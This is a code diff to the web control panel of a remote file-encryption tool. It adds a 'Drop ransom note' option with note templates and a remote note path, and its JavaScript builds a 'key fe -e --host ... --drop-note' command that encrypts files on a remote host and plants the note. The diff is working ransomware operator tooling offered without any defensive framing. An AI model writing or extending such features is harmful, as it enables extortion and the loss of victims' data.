@@ -193,6 +193,15 @@ tr:hover td{background:rgba(255,59,79,.065)}
           <div class="field"><label>Timeout seconds</label><input id="rhTimeout" value="30"></div>
           <div class="field"><label>Direction</label><select id="rhDir"><option>encrypt remote→local</option><option>decrypt local→remote</option></select></div>
         </div>
+        <div class="row">
+          <label><input type="checkbox" id="rhDrop"> Drop ransom note (--drop-note)</label>
+          <label><input type="checkbox" id="rhLocalIn"> Input is local (--local-in)</label>
+          <label><input type="checkbox" id="rhLocalOut"> Output is local (--local-out)</label>
+        </div>
+        <div class="row">
+          <div class="field"><label>Note template</label><select id="rhNoteTmpl"><option>press</option><option>generic</option><option>polite</option></select></div>
+          <div class="field"><label>Remote note path</label><input id="rhNotePath" value="NOTE.txt"></div>
+        </div>
         <button class="cyan" onclick="runRemote()">Run remote fe</button>
         <div class="cmdbox" id="rhCmd"></div>
         <div class="outbox" id="rhOut"></div>
@@ -301,13 +310,21 @@ async function runRemote(){
     output:document.getElementById('rhOutput').value,
     password:document.getElementById('rhPassword').value,
     timeout:document.getElementById('rhTimeout').value,
-    dir:document.getElementById('rhDir').value
+    dir:document.getElementById('rhDir').value,
+    drop:document.getElementById('rhDrop').checked,
+    noteTmpl:document.getElementById('rhNoteTmpl').value,
+    notePath:document.getElementById('rhNotePath').value,
+    localIn:document.getElementById('rhLocalIn').checked,
+    localOut:document.getElementById('rhLocalOut').checked
   };
   const encrypt = body.dir.startsWith('encrypt');
   let cmd='key fe '+(encrypt?'-e ':'-d ')+'--host '+shellQuote(body.host)+' -i '+shellQuote(body.input)+' -o '+shellQuote(body.output)+' -k '+shellQuote(body.password)+' --timeout '+body.timeout+' --local-out';
+  if(body.drop){cmd+=' --drop-note '+body.noteTmpl+' --note-out '+shellQuote(body.notePath);}
   show('rhCmd',escapeHtml(cmd));
   const r=await postJson('/run/remote',body);
-  show('rhOut',escapeHtml(r.output||r.error||''));
+  let out=escapeHtml(r.output||r.error||'');
+  if(r.note){out+='\n\n--- Remote note ('+r.notePath+') ---\n'+escapeHtml(r.note);}
+  show('rhOut',out);
 }
 
 async function runTerm(){
